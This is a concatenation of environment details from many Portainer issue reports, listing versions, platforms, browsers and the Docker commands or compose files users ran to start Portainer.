* target swarm version (if applicable): not applicable
* browser: chrome version 61.0.3163.100 (build officiel) (64 bits)
* portainer version: 1.15.3
* target docker version (the host/cluster you manage): docker version 17.09.0-ce, build afdb6d4
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer compose file adapted from
* target swarm version (if applicable): -
* browser: 62.0.3202.94
* portainer version: 1.15.4
* target docker version (the host/cluster you manage): 17.05.0-ce
* platform (windows/linux): ubuntu 16.04.3 lts
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v {custom_path}:/data portainer/portainer`
* target swarm version (if applicable):
* browser: google chrome 65.0.3290.0 (official build) canary (64 bits) on macos high sierra
* portainer version: 1.15.3 binary
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ./portainer
* portainer version: 1.15.3
* target docker version (the host/cluster you manage): docker version 17.09.0-ce, build afdb6d4
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
sudo docker service create --name portainer --replicas=1 --constraint 'node.role == manager' --constraint 'node.hostname == m1' --mount type=bind,src=//var/run/docker.sock,dst=/var/run/docker.sock --mount type=bind,src=//var/volumes/portainer,dst=/data --network=proxy --label com.df.distribute=true --label com.df.notify=true --label com.df.port=9000 --label com.df.servicedomain=<domain name here> --label com.df.servicepath=/ portainer/portainer -h unix:///var/run/docker.sock
* target swarm version (if applicable): 1.32
* browser: chrome / safari
* portainer version: 1.15.3
* target docker version (the host/cluster you manage): 17.09.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose.yml as below
---------------------------------- version: '3'
services: web: image: "portainer/portainer:1.15.3" volumes: - /var/run/docker.sock:/var/run/docker.sock ports: - "9000:9000"
---------------------------------- * target swarm version (if applicable): * browser: chrome 62.0.3202.94
* portainer version: 1.15.2
* target docker version (the host/cluster you manage): client: version: 17.06.0-ce api version: 1.30 go version: go1.8.3 git commit: 02c1d87 built: fri jun 23 21:17:04 2017 os/arch: linux/amd64 server: version: 17.06.0-ce api version: 1.30 (minimum version 1.12) go version: go1.8.3 git commit: 02c1d87 built: fri jun 23 21:15:57 2017 os/arch: linux/amd64 experimental: false * platform (windows/linux): linux * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run -d -p 192.168.0.10:9000:9000 --name portainer -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer * target swarm version (if applicable):
? * browser: google chrome 62.0.3202 (webkit 537.36) <img width="224" alt="2017-11-24 17 31 28" src=" ">
* portainer version: 1.15.2
* target docker version (the host/cluster you manage): 17.09.0-ce
* platform (windows/linux): linux (centos 7, current)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker service create --name portainer --publish 9000:9000 --constraint 'node.role == manager' --mount type=bind,src=//var/run/docker.sock,dst=/var/run/docker.sock portainer/portainer -h unix:///var/run/docker.sock`
* target swarm version (if applicable): 17.09.0-ce
* browser: google chrome 62 on fedora linux
* portainer version: 1.15.2
* target docker version (the host/cluster you manage): 17.09.0-ce
* platform (windows/linux): windows
* command used to start portainer: `docker run -p 9000:9000 portainer/portainer`
* target swarm version (if applicable): -
* browser: firefox 57.0 (64-bit)
* portainer version: 1.15.2
* target docker version (the host/cluster you manage): docker version 17.10.0-ce, build f4ffd25
* platform (windows/linux): ubuntu 17.10 artful
* command used to start portainer: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data --restart unless-stopped --name portainer portainer/portainer`
* target swarm version (if applicable):
* browser: chromium 62.0.3202.89 / firefox 57 your help is appreciated.
* portainer version: 1.15.1
* target docker version (the host/cluster you manage): 17.09.0-ce
* platform (windows/linux): linux/macos
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: safari
* portainer version: 1.15.1
* target docker version (the host/cluster you manage): 17.09-ce swarm mode on
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): i use a stack file similar like portainer-endpoint repo.
* target swarm version (if applicable):
* browser: chrome
* portainer version: 1.15.1
* target docker version (the host/cluster you manage): host is using docker-ce 17.09.0, windows host is on 17.10 ee preview 3
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): sudo docker run -d -p 80:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /etc/portainer/data:/data portainer/portainer:latest
* browser: chrome
* portainer version: 1.15.0
* target docker version (the host/cluster you manage): 17.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker service create \\ --name portainer \\ --mode global \\ --publish mode=host,published=9000,target=9000 \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ --limit-cpu 10 \\ --limit-memory 96m \\ portainer/portainer:1.15.0 -h unix:///var/run/docker.sock --no-auth
* target swarm version (if applicable): n/a
* browser: chrome 61.0.3163.100 (official build) (64-bit)
* portainer version: 1.15.0 i think this is enough to reproduce the bug.
* portainer version: 1.15.0
* target docker version (the host/cluster you manage): ```
client: version: 17.09.0-ce api version: 1.32 go version: go1.8.3 git commit: afdb6d4 built: tue sep 26 22:40:09 2017 os/arch: windows/amd64 server: version: 17.09.0-ce api version: 1.32 (minimum version 1.12) go version: go1.8.3 git commit: afdb6d4 built: tue sep 26 22:45:38 2017 os/arch: linux/amd64 experimental: true
``` * platform (windows/linux): windows 10
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```
version: \'2\' services: portainer: image: portainer/portainer container_name: "portainer-app" restart: always ports: [ "127.0.0.1:9000:9000" ] volumes: [ "//var/run/docker.sock:/var/run/docker.sock" ] networks: [ "net" ] command: --host=unix:///var/run/docker.sock watchtower: image: v2tec/watchtower container_name: "portainer-watchtower" restart: always volumes: [ "//var/run/docker.sock:/var/run/docker.sock" ] networks: [ "net" ] command: --cleanup portainer-app portainer-watchtower networks: net: driver: bridge
``` * browser: firefox version 56.0.1 (64-bit)
* portainer version: latest
* target docker version (the host/cluster you manage): latest
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): standard
* target swarm version (if applicable):
* browser: all browsers
root@mybox:/opt# ./portainer/portainer --no-auth -h unix:///var/run/docker.sock &
root@mybox:/opt# 2017/10/16 16:25:19 instance already has defined endpoints
skipping the endpoint defined via cli.
2017/10/16 16:25:19 starting portainer 1.15.0 on :9000 root@mybox:/opt# curl localhost:9000
<a href="bin/">bin/</a>
<a href="boot/">boot/</a>
<a href="cdrom/">cdrom/</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="docker/">docker/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="initrd.img">initrd.img</a>
<a href="initrd.img.old">initrd.img.old</a>
<a href="lib/">lib/</a>
<a href="lib64/">lib64/</a>
<a href="lost+found/">lost+found/</a>
<a href="media/">media/</a>
<a href="mnt/">mnt/</a>
<a href="opt/">opt/</a>
<a href="proc/">proc/</a>
<a href="root/">root/</a>
<a href="run/">run/</a>
<a href="sbin/">sbin/</a>
<a href="snap/">snap/</a>
<a href="srv/">srv/</a>
<a href="sys/">sys/</a>
<a href="tmp/">tmp/</a>
<a href="usr/">usr/</a>
<a href="var/">var/</a>
<a href="vmlinuz">vmlinuz</a>
<a href="vmlinuz.old">vmlinuz.old</a>
``` * portainer version: 1.15.0
* target docker version (the host/cluster you manage): 17.09-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* target swarm version (if applicable): -
* browser: chrome / firefox
portainer was launched from an sh script:
docker run -d -p 9000:9000 \\ -v "/var/run/docker.sock:/var/run/docker.sock" \\ -v /var/portainer/data:/data \\ --name=portainer \\ portainer/portainer \\ -h unix:///var/run/docker.sock * portainer version:1.15.0
* target docker version (the host/cluster you manage): docker version 17.03.1-ce, build c6d412e
* platform (windows/linux): linux(debian 8.8)
* browser: chrome
* portainer version: 1.14.3
* target docker version (the host/cluster you manage): 17.09.0-ce, build afdb6d4
* platform (windows/linux): centos7
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer
* target swarm version (if applicable):
* browser: chrome 61.0.3163.100
portainer version: 1.14.0
target docker version (the host/cluster you manage): 17.09.0-ce, build afdb6d4
platform (windows/linux): debian 8
command used to start portainer: docker run -p 9000:9000 portainer/portainer
browser: chrome stable
* portainer version: 1.14.3
* target docker version (the host/cluster you manage): 17.09.0-ce
* platform (windows/linux): ubuntu 16
* command used to start portainer: `docker run -p 9000:9000 portainer/portainer`
* browser: chrome stable
* portainer version: 1.14.3 (but not introduced this version)
* target docker version (the host/cluster you manage): 17.09.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker service create --detach=false --name portainer --publish 9000:9000 --constraint 'node.role == manager' --mount type=volume,src=portainer,dst=/data --secret portainer_password --mount type=bind,src=//var/run/docker.sock,dst=/var/run/docker.sock portainer/portainer -h unix:///var/run/docker.sock --admin-password-file /run/secrets/portainer_password
* target swarm version (if applicable):
* browser: chrome
* portainer version: `1.14.1`
* target docker version (the host/cluster you manage): `17.07.0-ce`
* platform (windows/linux): `centos 7 (linux)`
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker stack deploy -c my-config.yml my-stack`
* browser: `chrome 60`
* portainer version: 1.14.1
* target docker version (the host/cluster you manage): 17.06.2-ce
* platform (windows/linux): linux ubuntu 16.04.3
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer:/data portainer/portainer
* target swarm version (if applicable):
* browser: any browser?
* portainer version: 1.14
* target docker version (the host/cluster you manage): 1.12.6
* platform (windows/linux): linux
* command used to start portainer:
`docker run -v /var/run/docker.sock:/var/run/docker.sock:rw -v portainer-data:/data -p 9000:9000 portainer/portainer` * target swarm version (if applicable): n/a
* browser: chromium
* target docker version (the host/cluster you manage):17.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -d -p 9000:9000 -v /app/portainer:/data portainer/portainer:1.14.0 -h tcp://x.x.x.x:x`):
* target swarm version (if applicable):17.03.1-ce
* portainer version: latest
* target docker version (the host/cluster you manage): docker 17.03.1-ee-2 on linux, amd64
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 portainer/portainer
* target swarm version (if applicable): -
* browser: all of them
* portainer version: 1.14.0
* portainer version: develop
* target docker version (the host/cluster you manage): ce 17.06
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* target swarm version (if applicable):
* browser: safari
* portainer version:
$ docker images|grep porta
portainer/portainer latest 47dbf4321bb4 8 days ago 10.7mb
``` * target docker version (the host/cluster you manage):
$ rpm -qa|grep docker
docker-engine-selinux-17.05.0.ce-1.el7.centos.noarch
docker-engine-17.05.0.ce-1.el7.centos.x86_64
``` * platform (windows/linux):
gcp instance
3.10.0-514.26.2.el7.x86_64
$ cat /etc/redhat-release
centos linux release 7.3.1611 (core)
``` * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
$ docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
``` * target swarm version (if applicable):
google chrome 60.0.3112.101 fficial build
on mac 10.12.6
* portainer version: 1.13.5
* target docker version (the host/cluster you manage):
* platform (windows/linux): windows server 2016
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose.yml with command args: --ssl --sslcert /certs/portainer.crt --sslkey /certs/portainer.key -h tcp://172.20.80.1:2376 --tlsverify --tlscacert /certs/ca.pem --tlscert /certs/cert.pem --tlskey /certs/key.pem --no-analytics
* target swarm version (if applicable): n/a
* browser: chrome on android 59.3071.125 on android 7.0.0 sm-g950f build nrd90m (stock chrome via play store, stock samsung android)
chrome on desktop (win10) versie 59.0.3071.115 64bit
* portainer version: 1.13.6
* target docker version (the host/cluster you manage): 17.06.0-ce
* platform (windows/linux): ubuntu 16.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* target swarm version (if applicable): 17.06.0-ce
* browser: firefox 54.0
* portainer version: latest
* docker version: 17.06.0-ce * platform: windows 10
* command used to start portainer: portainer.exe
* target swarm version (if applicable): no
* browser: any
* portainer version: 1.13.6
* target docker version (the host/cluster you manage): 17.06.0-ce
* platform (windows/linux): windows * command used to start portainer:
`docker run --name=portainer --restart=always --label portainer=hidden -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /docker-data/portainer:/data portainer/portainer`
* target swarm version (if applicable): n/a
* browser: google chrome (60.0.3112.78 (officiel version) (64-bit))
* portainer version: 1.13.3
* target docker version (the host/cluster you manage): 17.05.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker compose file
* target swarm version (if applicable): 17.05.0-ce
* browser: chrome 59 on ubuntu
* portainer version: 1.13.4
* target docker version (the host/cluster you manage): vsphere integrated containers v1.1.1-10711-56a309f
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): doesn't matter
* browser: safari/firefox
* portainer version: 1.13.4
* target docker version (the host/cluster you manage): 17.06.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run -d -p 443:9000 -v xxx/certs:/certs -v xxx/data:/data -v /var/run/docker.sock:/var/run/docker.sock --name portainer --restart unless-stopped portainer/portainer --ssl --sslcert xxx --sslkey xxx`
* target swarm version (if applicable):
* browser: chrome 59.0.3071.115 (linux)
* portainer version: 1.13.5 (also happened on develop branch)
* target docker version (the host/cluster you manage): 1.11.2
* platform (windows/linux): qnap qts 4.3.3 build 0238 (kernel 4.2.8)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --name=portainer \\
--net=host --restart=on-failure \\
-v /share/docker_configs/portainer:/data \\
-v /var/run/docker.sock:/var/run/docker.sock portainer/portainer * target swarm version (if applicable):
* browser: safari 10.1.1
* portainer version: 1.13.4
* portainer version: 1.13.4
* target docker version (the host/cluster you manage): 17.06-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run --rm -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer --no-auth -h unix:///var/run/docker.sock
* target swarm version (if applicable): -
* browser: chrome
* portainer version: 1.13.4
* target docker version (the host/cluster you manage): 17.06
* portainer version: 1.13.4
* target docker version (the host/cluster you manage): 17.06-ce
* platform (windows/linux): ubuntu xenial lts
* command used to start portainer: using the compose file i showed earlier: `docker stack deploy -c docker-compose.yml portainer`
* browser: google chrome 58
* portainer version: latest, d.d
july 4 2017, 1.13.4 * target docker version (the host/cluster you manage): xxxxx@app-docker01:~$ docker -v
docker version 17.06.0-ce, build 02c1d87 * platform (windows/linux):
linux/ubuntu 14.04 * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker-compose:
version: \'2\' services: dockerui: image: portainer/portainer ports: - "5001:9000" volumes: - /home/bergtwvd/portainer:/data - /var/run/docker.sock:/var/run/docker.sock restart: always
* target swarm version (if applicable): 1.2.7
* browser: ff
* portainer version: 1.13.3 (but i've seen this in previous versions, too)
* target docker version (the host/cluster you manage): 17.05.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): started via docker-compose
* target swarm version (if applicable):
* browser: firefox
* portainer version: 1.13.3
* target docker version (the host/cluster you manage): 17.03.1-ce
* platform (windows/linux): linux, centos 7.3.1611
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker service create --name portainer --publish 9000:9000 --constraint 'node.role == manager' --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock --mount type=bind,src=/data,dst=/data portainer/portainer -h unix:///var/run/docker.sock`
* target swarm version (if applicable): 17.03.1-ce
* browser: chrome 58.0.3029.110 (64-bit), macos 10.12.5
* portainer version: 1.13.2
* target docker version: 17.03.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker image + -h unix:///var/run/docker.sock
* target swarm version (if applicable): -
* browser: safari
* portainer version: 1.13.2
* target docker version: 17.03.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker image + -h unix:///var/run/docker.sock
* target swarm version (if applicable): -
* browser: safari
* portainer version: 1.13.0 and 1.13.3
* target docker version (the host/cluster you manage): 17.05.0-ce-rc3
* platform (windows/linux): linux
* command used to start portainer: command: - "-h" - "unix:///var/run/docker.sock" - "--no-auth" - "--no-analytics" * target swarm version (if applicable):
* browser: chrome on windows 10
* portainer version: 1.13.3
* target docker version): 17.05.0-ce
* platform: linux 4.10.0-19-generic (ubuntu)
* command used to start portainer: docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome 57.0.2987.110 (64-bit)
* portainer version: 1.13.2
* target docker version (the host/cluster you manage): 17.03.1-ce, build c6d412e
* platform (windows/linux): linux ubuntu 17.01 * command used to start portainer: docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* target swarm version (if applicable): none
* browser: chrome 58.0.3029.110 (display resolution 192 )
* portainer version: 1.13.2
* target docker version (the host/cluster you manage): 17.05 ce
* platform (windows/linux): ubuntu 17.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose up -d * target swarm version (if applicable):
* browser: chrome, firefox
* portainer version: portainer/portainer:latest
* target docker version (the host/cluster you manage): 17.03.1-ce
* platform (windows/linux): linux
* command used to start portainer : `docker run -p 9000:9000 -v portainer-data:/data
-v /var/run/docker.sock:/var/run/docker.sock portainer/portainer` :
* browser: firefox 53.0.3
* portainer version: 1.13.2
* target docker version (the host/cluster you manage): 17.05.0-ce
* platform (windows/linux): linux
* command used to start portainer: `/usr/bin/docker run --name portainer -v "/var/run/docker.sock:/var/run/docker.sock" -v "/srv/portainer:/data" -p 6000:9000 portainer/portainer`
* target swarm version (if applicable): -
* browser: firefox 53.0.3 64bit it doesn't work with 1.13.1 and 1.13.0 either (when using `--templates`), but works fine with 1.12.4
* portainer version: portainer v1.13.1
* target docker version (the host/cluster you manage): 17.05ce
* platform (windows/linux): arm32 hypriotos
* portainer version: 1.13.0
* target docker version (the host/cluster you manage): server version: 17.03.1-ce
* platform (windows/linux): linux - ubuntu 16.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* target swarm version (if applicable): using swarm mode, 1 host (not sure how to find out version)
* browser: firefox 53.0.3 osx 10.12.5
* portainer version: 1.12.4
* target docker version (the host/cluster you manage): 17.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): doesn't matter
* target swarm version (if applicable): n/a
* browser: doesn't matter
on windows; with docker version 17.03.1-ce-win12 (12058) * portainer version: 1.12.4
* target docker version (the host/cluster you manage): version 17.03.1-ce-win12 (12058)
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer`):
* target swarm version (if applicable): single
* browser: chrome
* portainer version: 1.12.4
* platform (windows/linux): linux
* browser: firefox
* portainer version: 1.12.4
* target docker version (the host/cluster you manage): 17.05-ce
* portainer version: v1.12.4 (--no-auth)
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.1-ce
* target swarm version (if applicable): n/a
* platform (windows/linux): ubuntu 16.04 x64
* browser: tested on chromium 58.0.3029.81 and firefox 53.0
![image]( * platform (windows/linux): windows 10
* browser: chrome / firefox / edge
* portainer version: v1.12.4
* portainer docker image tag (latest/arm/windows...): none (/ latest)
* target docker version (the host/cluster you manage): 17.03.01-ce
* target swarm version (if applicable):
* platform (windows/linux): windows (target: linux)
* browser: chrome 57.0.2987.98 (64-bit)
* portainer version: 1.12.2
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.1-ce
* target swarm version (if applicable): api version 1.27
* platform (windows/linux): linux
* browser: firefox latest
* portainer version: 1.12.2
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.1-ce
* target swarm version (if applicable): api version 1.27
* platform (windows/linux): linux
* browser: firefox latest
* portainer version: 1.12.2
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.1-ce
* target swarm version (if applicable): api version 1.27
* platform (windows/linux): linux
* browser: firefox latest
* portainer version: 1.12.2
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.0-ce
* platform (windows/linux): centos 7 linux
* browser: chrome, firefox
* portainer version: 1.12.1
* portainer docker image tag (latest/arm/windows...): windows:latest
* target docker version (the host/cluster you manage): 17.03.0-ee-1
* target swarm version (if applicable):
* platform (windows/linux):windows
* browser:chrome
* portainer version: 1.12.1
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.0-ce
* target swarm version (if applicable):
* platform (windows/linux): linux
* browser: chrome 56.0.2924.87
* portainer version: v1.12.1 * portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.0-ce
* platform (windows/linux): linux
* browser: firefox 45.8.0
* portainer version: using portainer/portainer:latest as of 20.03.2017, so 1.12.1
* portainer docker image tag (latest/arm/windows...): latest
* docker info on master:
containers: 3 running: 3 paused: 0 stopped: 0
server version: 17.03.0-ce
storage driver: aufs root dir: /var/lib/docker/aufs backing filesystem: extfs dirs: 30 dirperm1 supported: true
logging driver: json-file
cgroup driver: cgroupfs
plugins: volume: local network: bridge host macvlan null overlay
swarm: active nodeid: yii6byvhp35z9043p1f323qey is manager: true clusterid: 52xpbowi6o339p54iwack8syp managers: 1 nodes: 1 orchestration: task history retention limit: 5 raft: snapshot interval: 10000 number of old snapshots to retain: 0 heartbeat tick: 1 election tick: 3 dispatcher: heartbeat period: 5 seconds ca configuration: expiry duration: 3 months node address: 172.16.0.5 manager addresses: 172.16.0.5:2377
runtimes: runc
default runtime: runc
init binary: docker-init
containerd version: 977c511eda0925a723debdc94d09459af49d082a
runc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70
init version: 949e6fa
security options: apparmor
kernel version: 3.19.0-65-generic
operating system: ubuntu 14.04.4 lts
ostype: linux
architecture: x86_64
total memory: 6.805 gib
name: swarm-master-6191c677-0
id: stca:bgr3:zu2k:dvv5:xpf3:aleo:prdk:eekg:ljeb:jafv:jmkl:wyds
docker root dir: /var/lib/docker
debug mode (client): false
debug mode (server): false
registry:
warning: no swap limit support
experimental: false
insecure registries: 127.0.0.0/8
live restore enabled: false
* docker version on master:
client: version: 17.03.0-ce api version: 1.26 go version: go1.7.5 git commit: 60ccb22 built: thu feb 23 10:57:47 2017 os/arch: linux/amd64 server: version: 17.03.0-ce api version: 1.26 (minimum version 1.12) go version: go1.7.5 git commit: 60ccb22 built: thu feb 23 10:57:47 2017 os/arch: linux/amd64 experimental: false
* docker info on agent:
containers: 2 running: 2 paused: 0 stopped: 0
role: primary
strategy: spread
filters: health, port, dependency, affinity, constraint
nodes: 2 swarm-agent-6191c677000002: 10.0.0.6:2375 status: healthy containers: 1 reserved cpus: 0 / 1 reserved memory: 0 b / 702 mib labels: executiondriver=<not supported>, kernelversion=3.19.0-65-generic, operatingsystem=ubuntu 14.04.4 lts, storagedriver=aufs error: (none) updatedat: 2017-03-19t23:59:39z swarm-agent-6191c677000003: 10.0.0.7:2375 status: healthy containers: 1 reserved cpus: 0 / 1 reserved memory: 0 b / 702 mib labels: executiondriver=<not supported>, kernelversion=3.19.0-65-generic, operatingsystem=ubuntu 14.04.4 lts, storagedriver=aufs error: (none) updatedat: 2017-03-19t23:59:55z
plugins: volume: network:
swarm: nodeid: is manager: false node address:
kernel version: 3.19.0-65-generic
operating system: linux
architecture: amd64
total memory: 1.371 gib
name: 240ff827f0d5
docker root dir:
debug mode (client): false
debug mode (server): false
warning: no kernel memory limit support
experimental: false
live restore enabled: false
* docker version on agent:
client: version: 17.03.0-ce api version: 1.24 (downgraded from 1.26) go version: go1.7.5 git commit: 60ccb22 built: thu feb 23 10:57:47 2017 os/arch: linux/amd64 server: version: swarm/1.1.0 api version: 1.22 (minimum version ) go version: go1.5.3 git commit: a0fd82b built: thu feb 4 08:55:18 utc 2016 os/arch: linux/amd64 experimental: false
* portainer version:
* portainer docker image tag (latest/arm/windows...): latest/windows
* target docker version (the host/cluster you manage):1.12.2-cs2-ws-beta
* target swarm version (if applicable):
* platform (windows/linux): windows 2016 datacenter kernel version 10.0 14393 (14393.693.amd64fre.rs1_release.161220-1747) * browser: internet explorer 11.0.38
* portainer version: 1.12.0
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.0-ce
* platform (windows/linux): linux
* portainer version: 1.11.4
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): docker version 1.12.6, build 78d1802
* target swarm version (if applicable):
* platform (windows/linux): linux / nginx
* browser: any nginx block in use: > upstream portainer {
> server 10.0.0.10:9000;
> location /portainer/ {
> proxy_http_version 1.1;
> proxy_set_header connection "";
> proxy_pass
> > location /portainer/api/websocket/ {
> proxy_set_header upgrade $http_upgrade;
> proxy_set_header connection "upgrade";
> proxy_http_version 1.1;
> proxy_pass
> } ![gif of steps to reproduce](
* portainer version: 1.11.4
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 17.03.0-ce
* platform (windows/linux): linux
* portainer version: v1.11.3
* portainer docker image tag latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.13.1
* target swarm version (if applicable): -
* platform (windows/linux): centos
* browser: latest internet explorer 11
* portainer version: 1.11.3
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.13.0
* platform (windows/linux): linux
* browser: google chrome 49
* portainer version: * portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.12.3
* target swarm version (if applicable):
* platform (windows/linux): linux
* browser: safari
* portainer version: latest:arm
* portainer docker image tag (latest/arm/windows...): docker:arm
* target docker version (the host/cluster you manage): * target swarm version (if applicable):
* platform (windows/linux): windows 7
* browser: firefox others tech infos: ![image]( thx for your help ! o/ monx
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.13
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.13.0
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): portainer/portainer:latest
* target docker version (the host/cluster you manage): docker version 1.13.0, build 49bf474 docker-compose version 1.10.0, build 4bd6f1a
* platform (windows/linux): tried on both osx 10.12.2 and ubuntu 16.04
* browser: chrome
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): built from source at release 1.11.1 (commit [d579f62f](
* target docker version (the host/cluster you manage): 1.12.1
* target swarm version (if applicable):
* platform (windows/linux): linux
* browser: firefox
* portainer version: 1.11.1
* portainer docker image tag: latest
* target docker version: 1.12.6
* platform: osx
* browser: chrome
* portainer version: portainer/portainer:0f6293c0231a
* portainer docker image tag (latest/arm/windows...): portainer/portainer
* target docker version (the host/cluster you manage): 1.12.2 build bb80604
* target swarm version (if applicable):
* platform (windows/linux): linux
* browser: chrome on android (android 6 and 7)
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.13.0-rc5
* target swarm version (if applicable): swarm mode 1.13.0-rc5
* portainer version: 1.11.1
* portainer docker image tag: latest
* target docker version: 1.10.3
* target swarm version: none
* platform: centos 7.3
* browser: chrome v55 on windows 7
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): latest
* platform (windows/linux): macos & linux
* portainer version: `1.11.1`
* portainer docker image tag (latest/arm/windows...): `latest`
* target docker version (the host/cluster you manage): `both`
* target swarm version (if applicable): `1.12.3 swarm mode`
* platform (windows/linux): `windows docker toolbox`
* browser: `vivaldi`
* portainer version: 1.11.1
* portainer docker image tag (latest/arm/windows...): latest
* platform (windows/linux): linux & macos
* browser: chrome
this bug was not present on safari * portainer version: 1.1.0
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): local
* target swarm version (if applicable): n/a
* platform (windows/linux): linux
* browser: chrome 53.0.2785.143 (64bits) **thanks**
portainer is such a useful piece of software..
thanks, this is not a critical bug but sometimes it can be annoying to see the line where i'm typing goes up and down.
* portainer version : 1.11.0
* portainer docker image tag : arm
* target docker version : 1.12.5
* platform : linux (raspberry pi)
* browser : chrome
i should in theory work with any program inside the container that stops and leaves a stale pid-file
* portainer version: 1.10.2
* portainer docker image tag (latest/arm/windows...): portainer/portainer:latest (at the time)
* target docker version (the host/cluster you manage): 1.12.3
* target swarm version (if applicable): na
* platform (windows/linux): ubuntu mate 16.04
* browser: safari 10.0.1
* portainer version: 1.11.0
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): 1.11.1 and 1.12.3
* target swarm version (if applicable): na
* platform (windows/linux): ubuntu 14.04 lts
* browser: chrome 42
* portainer version: 1.11.0
* portainer docker image tag (latest/arm/windows...): latest
* target docker version (the host/cluster you manage): host
* platform (windows/linux): linux
* portainer version: 1.11.0
* target docker version (the host/cluster you manage): 1.13.0-rc3 (docker for mac)
* target swarm version (if applicable):
* platform (windows/linux): mac
